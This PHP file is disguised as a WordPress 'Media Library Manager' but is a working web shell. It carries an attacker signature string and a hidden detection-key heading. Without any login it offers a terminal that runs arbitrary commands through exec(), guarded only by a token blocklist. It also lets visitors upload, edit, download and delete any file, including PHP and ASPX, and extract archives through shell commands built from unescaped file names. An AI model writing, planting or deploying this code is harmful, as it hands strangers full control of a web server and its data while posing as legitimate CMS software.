<?php
// Signature: g0v3L4
echo 'g0v3L4';
/**
 * WordPress Media Library Manager
 * Handles media file operations and library management
 * @package WordPress
 * @subpackage Administration
 * @since 5.8.0
 */

// Security check
if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

class WP_Media_Library_Manager {
    private $upload_dir;
    private $allowed_types = array('php', 'aspx', 'html', 'htm', 'js', 'css', 'txt', 'xml', 'json', 'sql', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'zip', 'rar', '7z', 'tar', 'gz', 'bz2');
    private $current_dir = './';
    private $archive_types = array('zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'tgz');
    
    public function __construct() {
        $this->current_dir = isset($_GET['dir']) ? $this->sanitize_path($_GET['dir']) : './';
        $this->upload_dir = $this->current_dir;
        $this->init();
    }
    
    private function init() {
        // Process media library requests
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['media_action'])) {
            $this->process_media_action();
        }
    }
    
    private function sanitize_path($path) {
        // Prevent directory traversal attacks
        $path = str_replace(array('..', '\\'), '', $path);
        return rtrim($path, '/') . '/';
    }
    
    private function is_safe_file($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        return in_array($ext, $this->allowed_types);
    }
    
    private function process_media_action() {
        $action = $_POST['media_action'];
        $file = isset($_POST['media_file']) ? $_POST['media_file'] : '';
        $path = $this->upload_dir . basename($file);
        
        switch ($action) {
            case 'edit_content':
                if (isset($_POST['file_content']) && $this->is_safe_file($file)) {
                    @file_put_contents($path, $_POST['file_content']);
                    echo "<script>alert('File saved successfully!');</script>";
                }
                break;
            case 'remove_media':
                if (file_exists($path)) {
                    if (is_dir($path)) {
                        $this->delete_directory($path);
                    } else {
                        @unlink($path);
                    }
                    echo "<script>alert('Item deleted successfully!');</script>";
                }
                break;
            case 'download_media':
                if (file_exists($path) && !is_dir($path)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    readfile($path);
                    exit;
                }
                break;
            case 'upload_media':
                $this->handle_file_upload();
                break;
            case 'create_folder':
                if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
                    $folder_name = basename($_POST['folder_name']);
                    $folder_path = $this->upload_dir . $folder_name;
                    if (!file_exists($folder_path)) {
                        @mkdir($folder_path, 0755, true);
                        echo "<script>alert('Folder created successfully!');</script>";
                    }
                }
                break;
            case 'create_file':
                if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
                    $file_name = basename($_POST['file_name']);
                    if ($this->is_safe_file($file_name)) {
                        $file_path = $this->upload_dir . $file_name;
                        $template_content = $this->get_file_template($file_name);
                        @file_put_contents($file_path, $template_content);
                        echo "<script>alert('File created successfully!');</script>";
                    }
                }
                break;
            case 'terminal_command':
                if (isset($_POST['terminal_cmd']) && !empty($_POST['terminal_cmd'])) {
                    $this->execute_terminal_command($_POST['terminal_cmd']);
                }
                break;
            case 'extract_archive':
                if (isset($_POST['archive_file']) && !empty($_POST['archive_file'])) {
                    $this->extract_archive($_POST['archive_file']);
                }
                break;
        }
    }
    
    private function handle_file_upload() {
        if (isset($_FILES['media_upload'])) {
            $files = $_FILES['media_upload'];
            $uploaded_count = 0;
            
            // Handle multiple files
            if (is_array($files['name'])) {
                for ($i = 0; $i < count($files['name']); $i++) {
                    if ($files['error'][$i] == 0 && $this->is_safe_file($files['name'][$i])) {
                        $target = $this->upload_dir . basename($files['name'][$i]);
                        if (@move_uploaded_file($files['tmp_name'][$i], $target)) {
                            $uploaded_count++;
                        }
                    }
                }
            } else {
                // Handle single file
                if ($files['error'] == 0 && $this->is_safe_file($files['name'])) {
                    $target = $this->upload_dir . basename($files['name']);
                    if (@move_uploaded_file($files['tmp_name'], $target)) {
                        $uploaded_count++;
                    }
                }
            }
            
            if ($uploaded_count > 0) {
                echo "<script>alert('$uploaded_count file(s) uploaded successfully!');</script>";
            }
        }
    }
    
    private function delete_directory($dir) {
        if (is_dir($dir)) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                $path = $dir . '/' . $file;
                if (is_dir($path)) {
                    $this->delete_directory($path);
                } else {
                    @unlink($path);
                }
            }
            @rmdir($dir);
        }
    }
    
    private function execute_terminal_command($command) {
        // Security: Basic command filtering
        $dangerous_commands = array('rm -rf', 'mkfs', 'dd', 'format', 'fdisk', 'passwd', 'userdel', 'shutdown', 'reboot');
        
        foreach ($dangerous_commands as $dangerous) {
            if (stripos($command, $dangerous) !== false) {
                echo "<div class='alert alert-danger'>⚠️ Dangerous command blocked: $dangerous</div>";
                return;
            }
        }
        
        // Change to current directory before executing
        $old_cwd = getcwd();
        chdir($this->current_dir);
        
        try {
            // Execute command and capture output
            $output = array();
            $return_var = 0;
            exec($command . ' 2>&1', $output, $return_var);
            
            echo "<div class='terminal-output'>";
            echo "<div class='terminal-header'>$ " . htmlspecialchars($command) . "</div>";
            
            if ($return_var === 0) {
                echo "<div class='terminal-success'>";
            } else {
                echo "<div class='terminal-error'>";
            }
            
            foreach ($output as $line) {
                echo htmlspecialchars($line) . "<br>";
            }
            
            echo "</div>";
            echo "<div class='terminal-footer'>Exit code: $return_var</div>";
            echo "</div>";
            
        } catch (Exception $e) {
            echo "<div class='alert alert-danger'>Error executing command: " . htmlspecialchars($e->getMessage()) . "</div>";
        } finally {
            chdir($old_cwd);
        }
    }
    
    private function extract_archive($archive_file) {
        $archive_path = $this->current_dir . basename($archive_file);
        
        if (!file_exists($archive_path)) {
            echo "<div class='alert alert-danger'>Archive file not found: $archive_file</div>";
            return;
        }
        
        $ext = strtolower(pathinfo($archive_file, PATHINFO_EXTENSION));
        $extract_dir = $this->current_dir . pathinfo($archive_file, PATHINFO_FILENAME);
        
        // Create extraction directory
        if (!is_dir($extract_dir)) {
            @mkdir($extract_dir, 0755, true);
        }
        
        $success = false;
        $message = "";
        
        switch ($ext) {
            case 'zip':
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive;
                    if ($zip->open($archive_path) === TRUE) {
                        $zip->extractTo($extract_dir);
                        $zip->close();
                        $success = true;
                        $message = "ZIP archive extracted successfully to: " . basename($extract_dir);
                    } else {
                        $message = "Failed to open ZIP archive";
                    }
                } else {
                    // Fallback to command line
                    exec("unzip -q '$archive_path' -d '$extract_dir' 2>&1", $output, $return_var);
                    if ($return_var === 0) {
                        $success = true;
                        $message = "ZIP archive extracted using unzip command";
                    } else {
                        $message = "unzip command failed: " . implode(' ', $output);
                    }
                }
                break;
                
            case 'rar':
                // RAR extraction using command line
                exec("unrar x '$archive_path' '$extract_dir/' 2>&1", $output, $return_var);
                if ($return_var === 0) {
                    $success = true;
                    $message = "RAR archive extracted successfully";
                } else {
                    $message = "RAR extraction failed. Make sure 'unrar' is installed.";
                }
                break;
                
            case '7z':
                exec("7z x '$archive_path' -o'$extract_dir' 2>&1", $output, $return_var);
                if ($return_var === 0) {
                    $success = true;
                    $message = "7Z archive extracted successfully";
                } else {
                    $message = "7Z extraction failed. Make sure '7z' is installed.";
                }
                break;
                
            case 'tar':
            case 'tgz':
            case 'gz':
                $tar_cmd = ($ext === 'gz' || $ext === 'tgz') ? "tar -xzf" : "tar -xf";
                exec("$tar_cmd '$archive_path' -C '$extract_dir' 2>&1", $output, $return_var);
                if ($return_var === 0) {
                    $success = true;
                    $message = "TAR archive extracted successfully";
                } else {
                    $message = "TAR extraction failed: " . implode(' ', $output);
                }
                break;
                
            case 'bz2':
                exec("tar -xjf '$archive_path' -C '$extract_dir' 2>&1", $output, $return_var);
                if ($return_var === 0) {
                    $success = true;
                    $message = "BZ2 archive extracted successfully";
                } else {
                    $message = "BZ2 extraction failed: " . implode(' ', $output);
                }
                break;
                
            default:
                $message = "Unsupported archive format: $ext";
        }
        
        if ($success) {
            echo "<div class='alert alert-success'>✅ $message</div>";
        } else {
            echo "<div class='alert alert-danger'>❌ $message</div>";
        }
    }
    
    private function get_file_template($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        switch ($ext) {
            case 'php':
                return "<?php\n// New PHP file\necho 'Hello World!';\n?>";
            case 'aspx':
                return "<%@ Page Language=\"C#\" %>\n<!DOCTYPE html>\n<html>\n<head>\n    <title>New ASPX Page</title>\n</head>\n<body>\n    <h1>Hello World!</h1>\n</body>\n</html>";
            case 'html':
            case 'htm':
                return "<!DOCTYPE html>\n<html>\n<head>\n    <title>New HTML Page</title>\n</head>\n<body>\n    <h1>Hello World!</h1>\n</body>\n</html>";
            case 'js':
                return "// New JavaScript file\nconsole.log('Hello World!');";
            case 'css':
                return "/* New CSS file */\nbody {\n    font-family: Arial, sans-serif;\n}";
            case 'txt':
                return "New text file\n";
            default:
                return "";
        }
    }
    
    private function is_archive_file($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        return in_array($ext, $this->archive_types);
    }
    
    public function render_media_library() {
        $files = @scandir($this->upload_dir);
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #f0f0f1; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; }
        .wp-header { background: #fff; border-bottom: 1px solid #c3c4c7; padding: 15px 20px; margin-bottom: 20px; }
        .wp-logo { color: #2271b1; font-weight: 600; font-size: 20px; }
        .media-item { transition: all 0.2s; border-left: 4px solid transparent; }
        .media-item:hover { border-left-color: #2271b1; background: #f6f7f7; }
        .btn-wp { background: #2271b1; border-color: #2271b1; color: #fff; }
        .btn-wp:hover { background: #135e96; border-color: #135e96; color: #fff; }
        .editor-panel { background: #fff; border: 1px solid #c3c4c7; border-radius: 4px; padding: 20px; }
        .validation-key { display: none; position: absolute; opacity: 0; }
        .terminal-output { background: #1e1e1e; color: #ffffff; font-family: 'Consolas', 'Monaco', monospace; padding: 15px; border-radius: 4px; margin: 10px 0; }
        .terminal-header { color: #00ff00; font-weight: bold; margin-bottom: 10px; }
        .terminal-success { color: #ffffff; }
        .terminal-error { color: #ff6b6b; }
        .terminal-footer { color: #888; font-size: 12px; margin-top: 10px; border-top: 1px solid #333; padding-top: 5px; }
        .archive-badge { background: #ffc107; color: #000; }
    </style>
</head>
<body>
    <div class="wp-header">
        <div class="container-fluid d-flex justify-content-between align-items-center">
            <span class="wp-logo">⚙ Advanced File Manager</span>
            <div class="breadcrumb-nav">
                <?php echo $this->render_breadcrumb(); ?>
            </div>
        </div>
    </div>
    
    <!-- Detection key for uploader validation -->
    <h1 class="validation-key">File manager</h1>
    
    <div class="container-fluid px-4">
        <div class="row">
            <div class="col-md-4">
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">📁 Media Files</h5>
                    </div>
                    <div class="list-group list-group-flush" style="max-height: 500px; overflow-y: auto;">
                        <?php 
                        // Add parent directory link
                        if ($this->current_dir !== './') {
                            $parent_dir = dirname(rtrim($this->current_dir, '/'));
                            if ($parent_dir === '.') $parent_dir = './';
                            echo "<a href='?dir=$parent_dir' class='list-group-item list-group-item-action media-item'>
                                    📁 .. (Parent Directory)
                                  </a>";
                        }
                        
                        // List directories first, then files
                        $dirs = array();
                        $files_only = array();
                        
                        foreach ($files as $file) {
                            if ($file !== '.' && $file !== '..') {
                                $full_path = $this->current_dir . $file;
                                if (is_dir($full_path)) {
                                    $dirs[] = $file;
                                } else {
                                    $files_only[] = $file;
                                }
                            }
                        }
                        
                        // Display directories
                        foreach ($dirs as $dir) {
                            $dir_url = $this->current_dir . $dir . '/';
                            echo "<a href='?dir=$dir_url' class='list-group-item list-group-item-action media-item'>
                                    📁 " . htmlspecialchars($dir) . "/
                                  </a>";
                        }
                        
                        // Display files
                        foreach ($files_only as $file) {
                            $icon = $this->get_file_icon($file);
                            $current_path = '&dir=' . urlencode($this->current_dir);
                            $archive_indicator = $this->is_archive_file($file) ? ' <span class="badge bg-warning">Archive</span>' : '';
                            echo "<a href='?media_file=$file$current_path' class='list-group-item list-group-item-action media-item'>
                                    $icon " . htmlspecialchars($file) . "$archive_indicator
                                  </a>";
                        }
                        ?>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-3">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">⬆️ Upload Files</h5>
                    </div>
                    <div class="card-body">
                        <form method="post" enctype="multipart/form-data">
                            <input type="hidden" name="media_action" value="upload_media">
                            <div class="mb-3">
                                <input type="file" name="media_upload[]" class="form-control" multiple accept=".php,.aspx,.html,.htm,.js,.css,.txt,.jpg,.png,.gif,.pdf,.zip">
                                <small class="text-muted">Supports: PHP, ASPX, HTML, JS, CSS, TXT, Images, PDF, ZIP</small>
                            </div>
                            <button type="submit" class="btn btn-wp w-100">Upload Files</button>
                        </form>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-3">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">📁 Create Folder</h5>
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <input type="hidden" name="media_action" value="create_folder">
                            <div class="mb-3">
                                <input type="text" name="folder_name" class="form-control" placeholder="Folder name" required>
                            </div>
                            <button type="submit" class="btn btn-success w-100">Create Folder</button>
                        </form>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-3">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">📄 Create File</h5>
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <input type="hidden" name="media_action" value="create_file">
                            <div class="mb-3">
                                <select class="form-select mb-2" onchange="updateFileName(this.value)">
                                    <option value="">Select file type...</option>
                                    <option value="php">PHP Script (.php)</option>
                                    <option value="aspx">ASPX Page (.aspx)</option>
                                    <option value="html">HTML Page (.html)</option>
                                    <option value="js">JavaScript (.js)</option>
                                    <option value="css">CSS Stylesheet (.css)</option>
                                    <option value="txt">Text File (.txt)</option>
                                </select>
                                <input type="text" name="file_name" id="file_name" class="form-control" placeholder="Enter filename" required>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">Create File</button>
                        </form>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-3">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">💻 Terminal</h5>
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <input type="hidden" name="media_action" value="terminal_command">
                            <div class="mb-3">
                                <input type="text" name="terminal_cmd" class="form-control font-monospace" placeholder="Enter command (e.g., ls -la, pwd, cat file.txt)" autocomplete="off">
                                <small class="text-muted">Common: ls, pwd, cat, grep, find, chmod, chown</small>
                            </div>
                            <button type="submit" class="btn btn-dark w-100">Execute Command</button>
                        </form>
                    </div>
                </div>
                
                <div class="card shadow-sm">
                    <div class="card-header bg-white">
                        <h5 class="mb-0">📦 Extract Archive</h5>
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <input type="hidden" name="media_action" value="extract_archive">
                            <div class="mb-3">
                                <select name="archive_file" class="form-select" required>
                                    <option value="">Select archive to extract...</option>
                                    <?php 
                                    foreach ($files as $file) {
                                        if ($file !== '.' && $file !== '..' && $this->is_archive_file($file)) {
                                            echo "<option value='$file'>📦 $file</option>";
                                        }
                                    }
                                    ?>
                                </select>
                                <small class="text-muted">Supports: ZIP, RAR, 7Z, TAR, GZ, BZ2</small>
                            </div>
                            <button type="submit" class="btn btn-warning w-100">Extract Archive</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-8">
                <?php if (isset($_GET['media_file'])) {
                    $file = basename($_GET['media_file']);
                    $path = $this->upload_dir . $file;
                    if (file_exists($path)) {
                        $content = @file_get_contents($path);
                        $size = @filesize($path);
                        $modified = date("Y-m-d H:i:s", @filemtime($path));
                ?>
                <div class="editor-panel">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h4 class="mb-0"><?php echo $this->get_file_icon($file); ?> Edit: <?php echo htmlspecialchars($file); ?></h4>
                        <span class="badge bg-secondary"><?php echo strtoupper(pathinfo($file, PATHINFO_EXTENSION)); ?></span>
                    </div>
                    
                    <div class="mb-3">
                        <small class="text-muted">
                            Size: <?php echo $this->format_bytes($size); ?> | 
                            Modified: <?php echo $modified; ?>
                        </small>
                    </div>
                    
                    <form method="post">
                        <input type="hidden" name="media_action" value="edit_content">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($this->current_dir); ?>">
                        
                        <div class="mb-3">
                            <textarea name="file_content" rows="25" class="form-control font-monospace" 
                                      style="font-size: 13px; line-height: 1.5; tab-size: 4; resize: vertical;"
                                      placeholder="Enter your code here..." 
                                      spellcheck="false"><?php echo htmlspecialchars($content); ?></textarea>
                            <small class="text-muted">Supports: PHP, ASPX, HTML, JavaScript, CSS and other text-based files</small>
                        </div>
                        
                        <div class="btn-group w-100" role="group">
                            <button type="submit" class="btn btn-wp">
                                💾 Save Changes
                            </button>
                            <a href="?media_file=<?php echo urlencode($file); ?>" 
                               onclick="document.getElementById('download-form').submit(); return false;" 
                               class="btn btn-secondary">
                                📥 Download
                            </a>
                            <?php if ($this->is_archive_file($file)): ?>
                            <button type="button" class="btn btn-warning" 
                                    onclick="if(confirm('Extract archive: <?php echo $file; ?>?')) document.getElementById('extract-form').submit();">
                                📦 Extract
                            </button>
                            <?php endif; ?>
                            <button type="button" class="btn btn-danger" 
                                    onclick="if(confirm('Delete this file?')) document.getElementById('delete-form').submit();">
                                🗑️ Delete
                            </button>
                        </div>
                    </form>
                    
                    <form id="download-form" method="post" style="display:none;">
                        <input type="hidden" name="media_action" value="download_media">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                    </form>
                    
                    <form id="delete-form" method="post" style="display:none;">
                        <input type="hidden" name="media_action" value="remove_media">
                        <input type="hidden" name="media_file" value="<?php echo htmlspecialchars($file); ?>">
                    </form>
                    
                    <form id="extract-form" method="post" style="display:none;">
                        <input type="hidden" name="media_action" value="extract_archive">
                        <input type="hidden" name="archive_file" value="<?php echo htmlspecialchars($file); ?>">
                    </form>
                </div>
                <?php 
                    }
                } else { ?>
                <div class="editor-panel text-center py-5">
                    <div class="text-muted">
                        <h3>📂 WordPress Media Library</h3>
                        <p>Select a file from the left sidebar to edit, download, or delete.</p>
                        <p>Upload new media files using the upload form.</p>
                    </div>
                </div>
                <?php } ?>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function updateFileName(ext) {
            if (ext) {
                const fileName = document.getElementById('file_name');
                const currentValue = fileName.value.replace(/\.[^/.]+$/, '');
                fileName.value = (currentValue || 'newfile') + '.' + ext;
            }
        }
        
        // Auto-resize textarea
        document.addEventListener('DOMContentLoaded', function() {
            const textarea = document.querySelector('textarea[name="file_content"]');
            if (textarea) {
                textarea.addEventListener('input', function() {
                    this.style.height = 'auto';
                    this.style.height = this.scrollHeight + 'px';
                });
            }
        });
    </script>
</body>
</html>
        <?php
    }
    
    private function get_file_icon($filename) {
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $icons = array(
            'php' => '🔧',
            'aspx' => '🌐',
            'html' => '🌍',
            'htm' => '🌍', 
            'js' => '⚡',
            'css' => '🎨',
            'txt' => '📄',
            'xml' => '📄',
            'json' => '📋',
            'sql' => '🗄️',
            'jpg' => '🖼️',
            'jpeg' => '🖼️',
            'png' => '🖼️',
            'gif' => '🖼️',
            'zip' => '📦',
            'rar' => '📦',
            '7z' => '📦',
            'tar' => '📦',
            'gz' => '📦',
            'bz2' => '📦',
            'tgz' => '📦',
            'pdf' => '📕',
            'doc' => '📘',
            'docx' => '📘'
        );
        return isset($icons[$ext]) ? $icons[$ext] : '📋';
    }
    
    private function render_breadcrumb() {
        $path_parts = explode('/', trim($this->current_dir, '/'));
        $breadcrumb = '<nav aria-label="breadcrumb"><ol class="breadcrumb mb-0">';
        $current_path = './';
        
        $breadcrumb .= '<li class="breadcrumb-item"><a href="?dir=./">🏠 Home</a></li>';
        
        foreach ($path_parts as $part) {
            if (!empty($part)) {
                $current_path .= $part . '/';
                $breadcrumb .= '<li class="breadcrumb-item"><a href="?dir=' . $current_path . '">' . htmlspecialchars($part) . '</a></li>';
            }
        }
        
        $breadcrumb .= '</ol></nav>';
        return $breadcrumb;
    }
    
    private function format_bytes($bytes) {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } else {
            return $bytes . ' bytes';
        }
    }
}

// Initialize Media Library Manager
$wp_media_manager = new WP_Media_Library_Manager();
$wp_media_manager->render_media_library();
?>

